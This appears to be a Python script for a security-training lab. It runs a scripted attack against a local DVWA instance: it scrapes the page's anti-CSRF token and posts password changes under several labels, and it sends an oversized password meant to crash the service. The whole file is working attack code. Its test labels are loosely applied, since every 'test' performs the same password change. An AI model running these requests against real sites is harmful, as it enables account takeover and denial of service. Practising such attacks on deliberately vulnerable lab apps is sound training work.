import requests
from bs4 import BeautifulSoup

def csrf_attack(session, base_url, endpoint, payload):
    response = session.get(base_url + endpoint)
    soup = BeautifulSoup(response.content, 'html.parser')
    
    # Find the CSRF token
    user_token_input = soup.find('input', {'name': 'user_token'})
    if user_token_input:
        user_token = user_token_input['value'] # type: ignore
        payload['user_token'] = user_token
    
    response = session.post(base_url + endpoint, data=payload)
    
    return response

def test_complete_compromise(session, base_url):
    print("Testing for complete compromise...")
    endpoint = 'vulnerabilities/csrf/'
    payload = {'password_new': 'newadminpass', 'password_conf': 'newadminpass', 'Change': 'Change'}
    response = csrf_attack(session, base_url, endpoint, payload)
    
    if "Password Changed" in response.text:
        print("Complete compromise detected. Password was changed.")
    else:
        print("No complete compromise detected.")

def test_gaining_privileges(session, base_url):
    print("Testing for gaining privileges...")
    endpoint = 'vulnerabilities/csrf/'
    payload = {'password_new': 'newuserpass', 'password_conf': 'newuserpass', 'Change': 'Change'}
    response = csrf_attack(session, base_url, endpoint, payload)
    
    if "Password Changed" in response.text:
        print("Privilege escalation detected. Password was changed.")
    else:
        print("No privilege escalation detected.")

def test_bypassing_protection(session, base_url):
    print("Testing for bypassing protection mechanism...")
    endpoint = 'vulnerabilities/csrf/'
    payload = {'password_new': 'bypass123', 'password_conf': 'bypass123', 'Change': 'Change'}
    response = csrf_attack(session, base_url, endpoint, payload)
    
    if "Password Changed" in response.text:
        print("Protection mechanism bypass detected. Password was changed.")
    else:
        print("No protection mechanism bypass detected.")

def test_modifying_data(session, base_url):
    print("Testing for reading or modifying application data...")
    endpoint = 'vulnerabilities/csrf/'
    payload = {'password_new': 'modifydata', 'password_conf': 'modifydata', 'Change': 'Change'}
    response = csrf_attack(session, base_url, endpoint, payload)
    
    if "Password Changed" in response.text:
        print("Data modification detected. Password was changed.")
    else:
        print("No data modification detected.")

def test_dos(session, base_url):
    print("Testing for denial of service (DoS)...")
    endpoint = 'vulnerabilities/csrf/'
    payload = {'password_new': 'a' * 10000, 'password_conf': 'a' * 10000, 'Change': 'Change'}  # Large payload to crash the service
    response = csrf_attack(session, base_url, endpoint, payload)
    
    if response.status_code == 500 or "Service Unavailable" in response.text:
        print("Denial of Service (DoS) detected. Service crashed or became unavailable.")
    else:
        print("No Denial of Service (DoS) detected.")

# Example usage
if __name__ == "__main__":
    session = requests.Session()
    base_url = "http://127.0.0.1/DVWA/"  # Adjusted for local DVWA instance
    
    # Ensure the session is logged in and security level is set to low
    from set_security import set_dvwa_security
    if set_dvwa_security(session, base_url, 'low'):
        test_complete_compromise(session, base_url)
        test_gaining_privileges(session, base_url)
        test_bypassing_protection(session, base_url)
        test_modifying_data(session, base_url)
        test_dos(session, base_url)
